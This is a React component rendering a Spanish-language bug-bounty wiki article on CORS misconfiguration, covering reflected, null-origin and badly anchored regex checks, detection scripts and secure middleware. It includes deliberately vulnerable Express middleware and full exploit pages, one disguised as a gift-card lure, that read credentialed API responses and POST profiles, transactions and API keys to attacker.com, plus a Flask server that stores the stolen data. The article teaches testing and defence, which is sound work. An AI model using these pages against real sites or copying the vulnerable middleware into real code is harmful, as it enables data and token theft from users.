/**
 * CORS MISCONFIGURATION
 * Explotar CORS mal configurado para robo de datos
 */

import { ReactNode } from 'react';
import {
  Section,
  Subsection,
  Paragraph,
  Strong,
  InlineCode,
  AlertInfo,
  AlertWarning,
  AlertDanger,
  AlertTip,
  CodeBlock,
  TerminalOutput,
  HighlightBox,
  ListItem
} from '@/components/WikiArticleComponents';
import { Globe, Shield, Lock, AlertTriangle, ArrowRight } from 'lucide-react';
import Link from 'next/link';

interface ArticleContentProps {
  locale: string;
}

export default function CORSMisconfigurationContent({ locale }: ArticleContentProps): ReactNode {
  return (
    <>
      <Section id="introduccion" title="CORS - Cuando el Navegador Confía en Cualquiera">
        <Paragraph>
          <Strong>Cross-Origin Resource Sharing (CORS)</Strong> mal configurado permite a 
          sitios maliciosos leer respuestas de APIs que deberían estar protegidas, 
          exponiendo datos sensibles y tokens de sesión.
        </Paragraph>

        <AlertDanger title="Impacto de CORS Vulnerable">
          <ul className="mt-2 space-y-1">
            <ListItem>🔐 Robo de datos sensibles (perfil, transacciones)</ListItem>
            <ListItem>🎯 Account takeover via session hijacking</ListItem>
            <ListItem>💰 Robo de tokens de API</ListItem>
            <ListItem>📧 Exfiltración de información privada</ListItem>
            <ListItem>🔑 Bypass de autenticación</ListItem>
          </ul>
        </AlertDanger>
      </Section>

      <Section id="fundamentos" title="1. CORS - Cómo Funciona">
        <Paragraph>
          Por defecto, navegadores bloquean requests cross-origin (SOP - Same-Origin Policy). 
          CORS permite a servidores especificar qué origins pueden acceder.
        </Paragraph>

        <CodeBlock
          language="http"
          title="Request cross-origin con credenciales"
          code={`GET /api/user/profile HTTP/1.1
Host: api.victim.com
Origin: https://attacker.com
Cookie: session=abc123

# Navegador envía Origin header
# Si servidor responde con CORS headers adecuados → Request permitido`}
        />

        <CodeBlock
          language="http"
          title="Response del servidor"
          code={`HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://attacker.com
Access-Control-Allow-Credentials: true

{"username": "john", "email": "john@victim.com", "ssn": "123-45-6789"}

# Access-Control-Allow-Origin: Permite attacker.com
# Access-Control-Allow-Credentials: Incluye cookies en request
# → attacker.com puede leer la respuesta ✓`}
        />
      </Section>

      <Section id="wildcard-vulnerable" title="2. Wildcard (*) con Credentials - Configuración Imposible">
        <CodeBlock
          language="javascript"
          title="❌ INTENTADO pero navegador lo bloquea"
          code={`// Esto NO funciona (navegador lo previene):
res.setHeader('Access-Control-Allow-Origin', '*');
res.setHeader('Access-Control-Allow-Credentials', 'true');

// Error en consola:
// "The value of the 'Access-Control-Allow-Origin' header in the response 
//  must not be the wildcard '*' when the request's credentials mode is 'include'"`}
        />

        <AlertInfo>
          Navegadores NO permiten <InlineCode>Access-Control-Allow-Origin: *</InlineCode> con 
          <InlineCode>Access-Control-Allow-Credentials: true</InlineCode> simultáneamente.
        </AlertInfo>
      </Section>

      <Section id="reflect-origin" title="3. Reflect Origin - Vulnerabilidad Crítica">
        <CodeBlock
          language="javascript"
          title="❌ VULNERABLE - Reflejar Origin header sin validación"
          code={`// Express.js middleware vulnerable
app.use((req, res, next) => {
  const origin = req.headers.origin;
  
  // ❌ VULNERABLE - Reflejar cualquier origin
  res.setHeader('Access-Control-Allow-Origin', origin);
  res.setHeader('Access-Control-Allow-Credentials', 'true');
  
  next();
});

// Cualquier sitio puede leer respuestas privadas ✓`}
        />

        <CodeBlock
          language="html"
          title="Exploit - Robar datos desde attacker.com"
          code={`<!DOCTYPE html>
<html>
<body>
  <h1>Win a Prize! 🎁</h1>
  
  <script>
    // Hacer request con credenciales a API vulnerable
    fetch('https://api.victim.com/user/profile', {
      credentials: 'include'  // ← Incluir cookies
    })
    .then(response => response.json())
    .then(data => {
      // Datos sensibles robados
      console.log('Stolen data:', data);
      
      // Exfiltrar a servidor del atacante
      fetch('https://attacker.com/steal', {
        method: 'POST',
        body: JSON.stringify(data)
      });
    });
  </script>
</body>
</html>

<!-- Víctima visita attacker.com mientras está logged in victim.com
Resultado: Datos del perfil exfiltrados ✓
-->`}
        />
      </Section>

      <Section id="null-origin" title="4. null Origin - Bypass de Validación">
        <Paragraph>
          Algunos servidores permiten <InlineCode>Origin: null</InlineCode> pensando que es seguro. 
          Pero iframes sandbox generan <InlineCode>Origin: null</InlineCode>.
        </Paragraph>

        <CodeBlock
          language="javascript"
          title="❌ VULNERABLE - Permitir null origin"
          code={`app.use((req, res, next) => {
  const origin = req.headers.origin;
  
  // ❌ VULNERABLE - Permitir null
  const allowedOrigins = ['https://trusted.com', 'null'];
  
  if (allowedOrigins.includes(origin)) {
    res.setHeader('Access-Control-Allow-Origin', origin);
    res.setHeader('Access-Control-Allow-Credentials', 'true');
  }
  
  next();
});`}
        />

        <CodeBlock
          language="html"
          title="Exploit - Generar Origin: null con iframe sandbox"
          code={`<!DOCTYPE html>
<html>
<body>
  <iframe sandbox="allow-scripts allow-same-origin" srcdoc="
    <script>
      fetch('https://api.victim.com/user/data', {
        credentials: 'include'
      })
      .then(r => r.json())
      .then(data => {
        parent.postMessage(data, '*');
      });
    </script>
  "></iframe>
  
  <script>
    window.addEventListener('message', (event) => {
      console.log('Stolen via null origin:', event.data);
      
      // Exfiltrar
      fetch('https://attacker.com/steal', {
        method: 'POST',
        body: JSON.stringify(event.data)
      });
    });
  </script>
</body>
</html>

<!-- iframe sandbox → Origin: null
Servidor permite null → Datos leídos ✓
-->`}
        />
      </Section>

      <Section id="subdomain-wildcard" title="5. Subdomain Wildcard - Regex Mal Implementado">
        <CodeBlock
          language="javascript"
          title="❌ VULNERABLE - Regex bypass"
          code={`app.use((req, res, next) => {
  const origin = req.headers.origin;
  
  // ❌ VULNERABLE - Regex sin anchors
  if (origin && origin.match(/victim\\.com/)) {
    res.setHeader('Access-Control-Allow-Origin', origin);
    res.setHeader('Access-Control-Allow-Credentials', 'true');
  }
  
  next();
});

// Bypass:
// Origin: https://victim.com.attacker.com → Match ✓
// Origin: https://attackervictim.com → Match ✓`}
        />

        <CodeBlock
          language="javascript"
          title="Exploit - Registrar dominio malicioso"
          code={`// Atacante registra: victim.com.attacker.com

// HTML en attacker.com:
fetch('https://api.victim.com/data', {
  credentials: 'include'
})
.then(r => r.json())
.then(data => {
  // Regex match: victim.com.attacker.com contiene "victim.com"
  // CORS permite leer respuesta → Datos robados ✓
  
  fetch('https://attacker.com/exfil', {
    method: 'POST',
    body: JSON.stringify(data)
  });
});`}
        />
      </Section>

      <Section id="pre-domain-wildcard" title="6. Pre-Domain Wildcard Bypass">
        <CodeBlock
          language="javascript"
          title="❌ VULNERABLE - Validación con endsWith"
          code={`app.use((req, res, next) => {
  const origin = req.headers.origin;
  
  // ❌ VULNERABLE - Solo verificar que termina con victim.com
  if (origin && origin.endsWith('.victim.com')) {
    res.setHeader('Access-Control-Allow-Origin', origin);
    res.setHeader('Access-Control-Allow-Credentials', 'true');
  }
  
  next();
});

// Bypass:
// Origin: https://attacker.com.victim.com (si atacante controla subdomain)
// Origin: https://evil-victim.com (si termina en victim.com)`}
        />
      </Section>

      <Section id="exploit-completo" title="7. Exploit Completo - Robo de Tokens">
        <CodeBlock
          language="html"
          title="Página del atacante - Robar JWT token"
          code={`<!DOCTYPE html>
<html>
<head>
  <title>Free Gift Card!</title>
</head>
<body>
  <h1>Congratulations! You won a $500 Amazon Gift Card! 🎉</h1>
  <p>Click below to claim...</p>
  
  <script>
    // Funciones de exfiltración
    async function stealData() {
      try {
        // 1. Robar perfil de usuario
        const profile = await fetch('https://api.victim.com/user/profile', {
          credentials: 'include'
        }).then(r => r.json());
        
        console.log('[+] Profile stolen:', profile);
        
        // 2. Robar lista de transacciones
        const transactions = await fetch('https://api.victim.com/transactions', {
          credentials: 'include'
        }).then(r => r.json());
        
        console.log('[+] Transactions stolen:', transactions);
        
        // 3. Robar API tokens
        const tokens = await fetch('https://api.victim.com/api-keys', {
          credentials: 'include'
        }).then(r => r.json());
        
        console.log('[+] API keys stolen:', tokens);
        
        // 4. Exfiltrar todo a servidor del atacante
        const stolenData = {
          profile,
          transactions,
          tokens,
          timestamp: new Date().toISOString(),
          victimUA: navigator.userAgent
        };
        
        await fetch('https://attacker.com/api/exfiltrate', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(stolenData)
        });
        
        console.log('[+] Data exfiltrated successfully');
        
        // 5. Redirigir a página legítima
        window.location = 'https://victim.com/sorry-expired';
        
      } catch (error) {
        console.error('[-] Exploit failed:', error);
      }
    }
    
    // Ejecutar exploit cuando página carga
    stealData();
  </script>
</body>
</html>`}
        />

        <CodeBlock
          language="python"
          title="Servidor del atacante - Recibir datos"
          code={`from flask import Flask, request
import json

app = Flask(__name__)

@app.route('/api/exfiltrate', methods=['POST'])
def exfiltrate():
    data = request.json
    
    print('[+] DATA STOLEN:')
    print(json.dumps(data, indent=2))
    
    # Guardar en base de datos
    with open('stolen_data.json', 'a') as f:
        f.write(json.dumps(data) + '\\n')
    
    return '', 204

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=443, ssl_context='adhoc')`}
        />
      </Section>

      <Section id="detection" title="8. Detectar CORS Misconfiguration">
        <CodeBlock
          language="bash"
          title="Pruebas manuales con curl"
          code={`# Probar reflect origin
curl -H "Origin: https://attacker.com" \\
  -H "Cookie: session=abc123" \\
  -i https://api.victim.com/user/profile

# Si respuesta contiene:
# Access-Control-Allow-Origin: https://attacker.com
# Access-Control-Allow-Credentials: true
# → VULNERABLE ✓

# Probar null origin
curl -H "Origin: null" \\
  -H "Cookie: session=abc123" \\
  -i https://api.victim.com/api/data

# Probar subdomain bypass
curl -H "Origin: https://victim.com.attacker.com" \\
  -H "Cookie: session=abc123" \\
  -i https://api.victim.com/endpoint`}
        />

        <CodeBlock
          language="python"
          title="Script automatizado - Detectar CORS issues"
          code={`import requests

TARGET = 'https://api.victim.com/user/profile'
COOKIE = 'session=abc123'

test_origins = [
    'https://attacker.com',
    'null',
    'https://victim.com.attacker.com',
    'https://attackervictim.com',
    'https://evil.victim.com'
]

for origin in test_origins:
    headers = {
        'Origin': origin,
        'Cookie': COOKIE
    }
    
    response = requests.get(TARGET, headers=headers)
    
    acao = response.headers.get('Access-Control-Allow-Origin')
    acac = response.headers.get('Access-Control-Allow-Credentials')
    
    if acao and acac == 'true':
        print(f'[!] VULNERABLE with Origin: {origin}')
        print(f'    ACAO: {acao}')
        print(f'    ACAC: {acac}')
        print(f'    Response: {response.text[:100]}...')
        print()
    else:
        print(f'[-] Not vulnerable with: {origin}')`}
        />
      </Section>

      <Section id="mitigacion" title="Mitigación Completa">
        <AlertDanger title="✅ CORS Seguro">
          Implementar whitelist estricta y validación correcta.
        </AlertDanger>

        <Subsection title="1. Whitelist Estricta de Origins">
          <CodeBlock
            language="javascript"
            title="✅ SEGURO - Exact match de origins permitidos"
            code={`const ALLOWED_ORIGINS = [
  'https://app.victim.com',
  'https://admin.victim.com',
  'https://mobile.victim.com'
];

app.use((req, res, next) => {
  const origin = req.headers.origin;
  
  // ✅ Exact match - No regex, no wildcards
  if (ALLOWED_ORIGINS.includes(origin)) {
    res.setHeader('Access-Control-Allow-Origin', origin);
    res.setHeader('Access-Control-Allow-Credentials', 'true');
  } else {
    // NO setear CORS headers si origin no está en whitelist
    console.warn(\`Blocked CORS request from: \${origin}\`);
  }
  
  next();
});`}
          />
        </Subsection>

        <Subsection title="2. Validación de Subdomains con Regex Seguro">
          <CodeBlock
            language="javascript"
            title="✅ SEGURO - Regex con anchors"
            code={`app.use((req, res, next) => {
  const origin = req.headers.origin;
  
  // ✅ Regex con ^ y $ (anchors)
  const allowedPattern = /^https:\\/\\/([a-z0-9-]+\\.)?victim\\.com$/;
  
  if (origin && allowedPattern.test(origin)) {
    res.setHeader('Access-Control-Allow-Origin', origin);
    res.setHeader('Access-Control-Allow-Credentials', 'true');
  }
  
  next();
});

// Permite:
// https://victim.com ✓
// https://app.victim.com ✓
// https://api.victim.com ✓

// Bloquea:
// https://victim.com.attacker.com ✗ (no match)
// https://attackervictim.com ✗ (no match)
// http://victim.com ✗ (http, no https)`}
          />
        </Subsection>

        <Subsection title="3. NO Permitir null Origin">
          <CodeBlock
            language="javascript"
            title="✅ SEGURO - Rechazar null"
            code={`app.use((req, res, next) => {
  const origin = req.headers.origin;
  
  // ✅ Rechazar null explícitamente
  if (!origin || origin === 'null') {
    // No setear CORS headers
    return next();
  }
  
  // Validar contra whitelist
  if (ALLOWED_ORIGINS.includes(origin)) {
    res.setHeader('Access-Control-Allow-Origin', origin);
    res.setHeader('Access-Control-Allow-Credentials', 'true');
  }
  
  next();
});`}
          />
        </Subsection>

        <Subsection title="4. Vary: Origin Header">
          <CodeBlock
            language="javascript"
            title="✅ Importante para caching"
            code={`app.use((req, res, next) => {
  const origin = req.headers.origin;
  
  if (ALLOWED_ORIGINS.includes(origin)) {
    res.setHeader('Access-Control-Allow-Origin', origin);
    res.setHeader('Access-Control-Allow-Credentials', 'true');
    
    // ✅ Vary header previene cache poisoning
    res.setHeader('Vary', 'Origin');
  }
  
  next();
});

// Vary: Origin asegura que cache considera Origin header
// Previene que response cacheado con Origin: attacker.com
// sea servido a request con Origin: victim.com`}
          />
        </Subsection>

        <Subsection title="5. Preflight Requests (OPTIONS)">
          <CodeBlock
            language="javascript"
            title="✅ SEGURO - Manejar OPTIONS correctamente"
            code={`app.options('*', (req, res) => {
  const origin = req.headers.origin;
  
  if (ALLOWED_ORIGINS.includes(origin)) {
    res.setHeader('Access-Control-Allow-Origin', origin);
    res.setHeader('Access-Control-Allow-Credentials', 'true');
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');
    res.setHeader('Access-Control-Max-Age', '86400');  // Cache 24h
  }
  
  res.status(204).end();
});`}
          />
        </Subsection>

        <Subsection title="6. Usar CORS Middleware Seguro">
          <CodeBlock
            language="javascript"
            title="✅ Express CORS middleware configurado correctamente"
            code={`const cors = require('cors');

const corsOptions = {
  origin: function (origin, callback) {
    // ✅ Permitir requests sin Origin (same-origin, Postman, etc.)
    if (!origin) return callback(null, true);
    
    // ✅ Verificar contra whitelist
    if (ALLOWED_ORIGINS.includes(origin)) {
      callback(null, true);
    } else {
      callback(new Error('Not allowed by CORS'));
    }
  },
  credentials: true,  // Permitir cookies
  optionsSuccessStatus: 200
};

app.use(cors(corsOptions));`}
          />
        </Subsection>

        <Subsection title="7. Alternativa: Tokens en Headers (No Cookies)">
          <CodeBlock
            language="javascript"
            title="✅ MEJOR - Evitar credentials: include"
            code={`// En lugar de usar cookies + CORS credentials:

// Cliente:
fetch('https://api.victim.com/data', {
  headers: {
    'Authorization': 'Bearer ' + localStorage.getItem('token')
  }
  // credentials: 'include' NO necesario
})

// Servidor:
app.use((req, res, next) => {
  // ✅ Permitir origins sin credentials
  res.setHeader('Access-Control-Allow-Origin', '*');
  
  // NO setear Allow-Credentials
  // Tokens en Authorization header, no cookies
  
  next();
});

// Ventajas:
// - No necesita Access-Control-Allow-Credentials
// - Puede usar wildcard (*)
// - Más seguro contra CSRF`}
          />
        </Subsection>
      </Section>

      <div className="mt-12 pt-8 border-t border-slate-200 dark:border-slate-800">
        <h3 className="text-2xl font-bold text-slate-900 dark:text-white mb-4">Siguiente: Subdomain Takeover</h3>
        <Link
          href={`/${locale}/wiki/bug-bounty/subdomain-takeover`}
          className="group inline-flex items-center gap-3 px-6 py-4 bg-gradient-to-r from-orange-600 to-red-600 text-white rounded-xl font-semibold hover:shadow-xl hover:shadow-orange-500/50 transition-all"
        >
          <span>Tomar control de subdominios abandonados</span>
          <ArrowRight className="w-5 h-5 group-hover:translate-x-1 transition-transform" />
        </Link>
      </div>
    </>
  );
}
